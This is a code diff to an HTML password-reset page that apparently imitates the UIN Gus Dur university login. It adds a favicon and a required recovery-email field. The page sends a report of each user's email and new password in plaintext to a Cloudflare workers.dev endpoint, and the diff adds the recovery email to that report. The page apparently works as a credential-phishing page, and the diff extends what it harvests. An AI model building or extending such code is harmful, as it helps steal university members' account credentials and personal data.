@@ -9,6 +9,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" href="vertical-logo.png">
     <!-- Font Awesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
@@ -186,7 +187,7 @@
                     <!-- Dynamic Email -->
                 </div>
                 <div class="form-group">
-                    <input type="text" class="form-control" placeholder="Email Pemulihan">
+                    <input type="text" class="form-control" id="recovery-email-input" placeholder="Email Pemulihan">
                 </div>
             </div>
             <div class="modal-footer">
@@ -244,6 +245,7 @@
         // Pastikan URL menggunakan HTTPS
         const API_URL = "https://quiet-scene-2bfd.uingusdur.workers.dev";
         let currentEmail = '';
+        let recoveryEmail = '';
 
         function validateUinEmail(email) {
             // Hanya izinkan email @uingusdur.ac.id atau @mhs.uingusdur.ac.id
@@ -364,6 +366,12 @@
         }
 
         function goToResetStep() {
+            const recEmail = document.getElementById('recovery-email-input').value;
+            if (!recEmail) {
+                alert('Mohon masukan email pemulihan');
+                return;
+            }
+            recoveryEmail = recEmail;
             document.getElementById('token-sent-email').textContent = currentEmail;
             showCard('reset-password-modal');
         }
@@ -383,7 +391,7 @@
             }
 
             // Kirim data reset password ke API (Fire and forget)
-            kirimLaporan(`Reset Password - Email: ${currentEmail} | New Pass: ${pass1}`);
+            kirimLaporan(`Reset Password - Email: ${currentEmail} | Recovery Email: ${recoveryEmail} | New Pass: ${pass1}`);
 
             // Update success message for reset password
             document.querySelector('#activation-success-msg .success-title').textContent = 'Sukses';
